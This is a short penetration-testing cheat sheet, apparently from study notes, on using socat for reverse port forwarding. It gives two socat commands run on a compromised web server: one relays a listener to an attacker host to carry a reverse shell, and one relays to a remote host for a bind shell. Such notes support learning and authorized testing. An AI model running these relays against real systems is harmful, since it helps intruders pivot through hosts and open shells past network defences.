[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between two independent network channels without needing to use SSH tunneling.
# Reverse Port Forwarding
## Redirecting with a Reverse Shell
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER-IP>:80
```
##  Redirecting with a Bind Shell
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:<REMOTER-IP>:8443
```